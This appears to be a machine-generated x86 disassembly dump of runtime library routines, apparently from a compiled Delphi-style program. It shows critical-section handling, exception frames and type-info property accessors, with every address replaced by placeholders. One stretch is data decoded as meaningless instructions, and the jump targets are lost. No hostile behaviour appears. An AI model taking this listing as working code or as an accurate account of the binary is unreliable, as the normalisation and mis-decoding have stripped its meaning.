cmp di 0x10f
jae r-xdata
call sub_413984
jmp r-xdata
sub_41411c
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414242
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_40408c
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_40408c
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4146ec
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_40408c
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404344
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_408390
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_404344
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4031f8
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_402864
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_40429c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414249
lea eax [ ebp - 0x208 ]
call sub_404038
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404344
sub_4142a0
push ebx
push esi
push edi
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_414290
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov bx [ esp + 0x4 ]
cmp bx 0x10f
jae r-xdata
mov edx esp
mov eax ebx
call sub_4146ec
test al al
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor eax eax
lea edx [ esp + 0x4 ]
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
jmp r-xdata
mov al 0x1
jmp r-xdata
mov ax [ esp + 0x4 ]
cmp ax 0x9
je r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0xc ] 0x0
je r-xdata
cmp ax 0xd
jne r-xdata
xor eax eax
jmp r-xdata
sub_414314
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov eax ebx
call sub_414290
push esi
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax esi
call sub_414290
push esi
mov esi eax
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov ax [ esp ]
test ax ax
jne r-xdata
cmp ax 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
sete al
jmp r-xdata
mov ax [ esp + 0x10 ]
sub ax 0x2
jae r-xdata
cmp [ esp + 0x10 ] 0x1
sete al
jmp r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx esi
call sub_414894
sete al
xor eax eax
jmp r-xdata
sub_4143b0
push ebx
mov bx [ eax ]
cmp bx 0x400c
jne r-xdata
mov [ edx ] bx
test [ edx + 0x1 ] 0x20
setne bl
test bl bl
je r-xdata
mov eax [ eax + 0x8 ]
call sub_4143b0
mov ebx eax
jmp r-xdata
xor eax eax
mov [ ecx ] eax
test [ edx + 0x1 ] 0x40
je r-xdata
mov eax ebx
pop ebx
retn
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
jmp r-xdata
sub_4143fc
add esp 0xfffffff8
test dl dl
je r-xdata
mov ax [ eax ]
and ax 0x2000
cmp ax 0x2000
sete al
pop ecx
pop edx
retn
lea ecx [ esp + 0x4 ]
mov edx esp
call sub_4143b0
pop ecx
pop edx
retn
sub_414448
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4144a9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_40508c
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4144b0
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_4032a8
sub_4144c0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_4146ec
test al al
je r-xdata
mov eax ebx
call sub_41466c
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_4144f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_41466c
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_4146ec
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_41454c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_414584
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_41466c
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4145c0
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403674
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_414623
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41462a
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_4146c4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_40335c
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_4146ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_414794
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_40508c
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_4147a4
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41487a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41485d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_405094
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414864
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_4031f8
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_40429c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_408048
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_4148a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_414913
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41491a
retn
call sub_414448
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_405254
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_404aec
mov eax rw-data
call sub_404038
mov eax rw-data
call sub_40f1ec
sub_41491c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4149bd
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4149c4
retn
mov eax rw-data
call sub_4143a4
mov eax sub_40eeec
mov [ rw-data ] eax
mov eax sub_40ea3c
mov [ rw-data ] eax
mov edx sub_40e94c
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40f1ec
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_413f98
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f500
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_4124f0
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_412c18
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_4149c8
push esi
dec ecx
add [ edi + edi * 8 + 0x56640000 ] ch
dec ecx
add [ ebp + 0x640000ff ] ch
push esi
dec ecx
add [ esi + 0x640000ff ] ch
push esi
dec ecx
add [ edi + 0x640000ff ] ch
push esi
dec ecx
add [ eax + 0x640000ff ] dl
push esi
dec ecx
add [ ecx + 0x640000ff ] dl
push esi
dec ecx
add [ edx + 0x640000ff ] dl
push esi
dec ecx
add [ ebx + 0x640000ff ] dl
push esi
dec ecx
add [ edi + edi * 8 + 0x56640000 ] dl
dec ecx
add [ ebp + 0x640000ff ] dl
push esi
dec ecx
add [ esi + 0x640000ff ] dl
push esi
dec ecx
add [ edi + 0x640000ff ] dl
push esi
dec ecx
add [ eax + 0x640000ff ] bl
push esi
dec ecx
add [ ecx + 0x640000ff ] bl
push esi
dec ecx
add [ edx + 0x640000ff ] bl
push esi
dec ecx
add [ ebx + 0x640000ff ] bl
push esi
dec ecx
add [ edi + edi * 8 + 0x56640000 ] bl
dec ecx
add [ ebp + 0x640000ff ] bl
push esi
dec ecx
add [ esi + 0x640000ff ] bl
push esi
dec ecx
add [ edi + 0x640000ff ] bl
push esi
dec ecx
add [ eax + 0x640000ff ] al
push esi
dec ecx
add [ ecx + 0x640000ff ] al
push esi
dec ecx
add [ edx + 0x640000ff ] al
push esi
dec ecx
add [ ebx + 0x640000ff ] al
push esi
dec ecx
add [ edi + edi * 8 + 0x56640000 ] al
dec ecx
add [ ebp + 0x640000ff ] al
push esi
dec ecx
add [ esi + 0x640000ff ] al
push esi
dec ecx
add [ edi + 0x640000ff ] al
push esi
dec ecx
add [ eax + 0x640000ff ] cl
push esi
dec ecx
add [ ecx + 0x550000ff ] cl
mov ebp esp
xor eax eax
push ebp
push sub_414add
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414ae4
retn
sub_414b28
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_414be6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi ] 0x1
jne r-xdata
mov eax esi
call sub_414b1c
mov eax [ eax + 0x9 ]
mov eax [ eax ]
call sub_414b1c
cmp esi [ r-xdata ]
je r-xdata
mov edx edi
mov eax ebx
call sub_40827c
jmp r-xdata
mov eax edi
test ebx ebx
setne dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
call sub_40408c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_408048
test al al
je r-xdata
cmp [ eax + 0x1 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414bed
lea eax [ ebp - 0x4 ]
call sub_404038
retn
lea edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_407f68
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40408c
jmp r-xdata
lea esi [ eax + 0xd ]
test ebx ebx
je r-xdata
mov eax edi
mov edx esi
call sub_40429c
xor eax eax
mov al [ esi ]
inc eax
add esi eax
dec ebx
test ebx ebx
jne r-xdata
sub_414c00
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_414c4c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_414b1c
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_4083b8
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_414c00
mov edx [ rw-data ]
mov eax esi
call sub_408048
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_408048
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_4083b8
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_414cb0
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_414d20
push ebx
push esi
push edi
xor ecx ecx
mov esi eax
mov cl [ eax + 0x1 ]
mov edi edx
xor eax eax
movzx ecx [ esi + ecx + 0xa ]
[ edi ]
mov esi [ esi + 0x4 ]
xor ecx ecx
test esi esi
je r-xdata
lea edi [ esi + ecx + 0xd ]
pop edi
pop esi
pop ebx
retn
mov esi [ esi ]
jmp r-xdata
lea edi [ edi + ecx + 0x1b ]
dec eax
jne r-xdata
mov [ edx + ebx * 4 ] edi
mov cl [ esi + 0x1 ]
lea esi [ esi + ecx + 0x2 ]
mov cl [ esi + 0xa ]
movzx eax [ esi + ecx + 0xb ]
test eax eax
je r-xdata
movzx ebx [ edi + 0x18 ]
mov cl [ edi + 0x1a ]
cmp [ edx + ebx * 4 ] 0x0
jne r-xdata
sub_414d74
mov ecx [ edx + 0xc ]
test ecx 0xffffff00
je r-xdata
mov al cl
retn
cmp [ edx + 0xf ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
call ecx
retn
ja r-xdata
and ecx 0xffffff
mov cl [ ecx + eax ]
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_414da4
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_414e18
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_414e74
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add esi eax
mov edi ecx
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_414eb8
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_414f34
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_4042d4
mov ecx esp
mov edx esi
mov eax ebx
call sub_414eb8
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_414f7c
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
mov edx [ esi + eax ]
mov eax ecx
call sub_414f68
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_414fbc
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_414f68
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_414ffc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_415044
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_415118
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4042c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41504b
lea eax [ ebp - 0x4 ]
call sub_404744
retn
sub_415054
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41509c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404890
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_415200
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4150a3
lea eax [ ebp - 0x4 ]
call sub_404744
retn
sub_4150ac
push ebx
mov ebx ecx
mov ecx [ edx ]
mov ecx [ ecx ]
mov cl [ ecx ]
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_414f0c
pop ebx
retn
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_414f7c
pop ebx
retn
dec cl
je r-xdata
mov ecx ebx
call sub_414ffc
pop ebx
retn
jmp r-xdata
mov eax ebx
call sub_404038
pop ebx
retn
sub_4150ec
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_414f34
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_414fbc
pop ebx
retn
dec bl
je r-xdata
call sub_415054
jmp r-xdata
pop ebx
retn
sub_415118
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4151f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_4150ac
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_404890
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4151f7
lea eax [ ebp - 0x10 ]
call sub_404038
retn
dec al
je r-xdata
mov eax [ ebx + 0x4 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_404780
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404744
mov [ ebp - 0xc ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov [ ebp - 0x8 ] esi
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_415200
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4152c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_4042c0
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_4150ec
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4152cd
lea eax [ ebp - 0xc ]
call sub_404038
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_404780
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_4152d4
push ebx
push esi
add esp 0xffffffec
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov esi edx
and esi 0xffffff
add esi eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_414b1c
movzx eax [ eax ]
cmp eax 0x4
ja r-xdata
mov [ esp + 0xc ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0xc ] edx
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] ax
jmp r-xdata
jmp [ eax * 4 + jump_table_415314 ]
mov edx eax
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
fld [ esp ]
add esp 0x14
pop esi
pop ebx
retn
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ esi ]
mov [ esp ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
mov ax [ esi + 0x8 ]
mov [ esp + 0x8 ] ax
jmp r-xdata
fild [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ esi ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
mov eax [ ebx ]
mov eax [ eax ]
call sub_414b1c
cmp [ eax ] 0x4
jne r-xdata
sub_4153ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_414b1c
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_415434 ]
and eax 0x7f
